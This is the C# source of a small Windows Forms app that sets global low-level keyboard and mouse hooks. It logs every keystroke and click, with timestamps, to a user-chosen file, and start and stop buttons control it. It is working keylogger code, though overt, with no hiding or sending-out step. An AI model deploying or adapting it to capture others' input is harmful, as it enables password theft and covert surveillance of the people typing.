using System;
using System.IO;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace logHistoryKeys
{
    public partial class Form1 : Form
    {
        enum HookType
        {
            WH_KEYBOARD_LL = 13,
            WH_MOUSE_LL = 14
        }

        private bool isLogging = false;
        private string logFilePath;
        private HookProc keyboardHookDelegate;
        private HookProc mouseHookDelegate;
        private IntPtr keyboardHookId = IntPtr.Zero;
        private IntPtr mouseHookId = IntPtr.Zero;

        public Form1()
        {
            InitializeComponent();
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if (!isLogging && this.txtPath.Text != "")
            {
                logFilePath = this.txtPath.Text;
                keyboardHookDelegate = KeyboardHookProc;
                mouseHookDelegate = MouseHookProc;
                keyboardHookId = SetHook(HookType.WH_KEYBOARD_LL, keyboardHookDelegate);
                mouseHookId = SetHook(HookType.WH_MOUSE_LL, mouseHookDelegate);
                isLogging = true;
                btnStart.Enabled = false;
                btnStop.Enabled = true;
            }

        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            if (isLogging && this.txtPath.Text != "")
            {
                UnhookWindowsHookEx(keyboardHookId);
                UnhookWindowsHookEx(mouseHookId);
                isLogging = false;
                btnStart.Enabled = true;
                btnStop.Enabled = false;
            }
        }

        private IntPtr SetHook(HookType hookType, HookProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx((int)hookType, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

        private IntPtr KeyboardHookProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                char keyChar = (char)vkCode;

                if (isLogging)
                {
                    using (StreamWriter logFile = new StreamWriter(logFilePath, true))
                    {
                        logFile.WriteLine("|" + DateTime.Now + "|:    " + keyChar);
                    }
                }
            }

            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private IntPtr MouseHookProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == (IntPtr)WM_LBUTTONDOWN || wParam == (IntPtr)WM_RBUTTONDOWN))
            {
                int x = Marshal.ReadInt32(lParam);
                int y = Marshal.ReadInt32(lParam + 4);

                if (isLogging)
                {
                    using (StreamWriter logFile = new StreamWriter(logFilePath, true))
                    {
                        logFile.WriteLine("|" + DateTime.Now  + "|:    " + $"Mouse click at X: {x}, Y: {y}");
                    }
                }
            }

            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        const int WM_KEYDOWN = 0x0100;
        const int WM_LBUTTONDOWN = 0x0201;
        const int WM_RBUTTONDOWN = 0x0204;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

    }
}
